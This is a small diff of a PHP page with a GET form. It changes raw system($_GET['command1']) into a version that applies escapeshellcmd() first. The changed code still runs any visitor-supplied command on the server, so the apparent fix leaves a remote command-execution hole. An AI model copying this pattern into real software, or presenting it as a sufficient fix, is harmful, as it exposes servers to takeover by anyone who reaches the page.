@@ -1,6 +1,8 @@
 <?php
-$cmd = $_GET['command1'];
-system($cmd);
+if (isset($_GET['command1'])) {
+    $cmd = escapeshellcmd($_GET['command1']);
+    system($cmd);
+}
 ?>
 <html>
     <form action="" method="get">
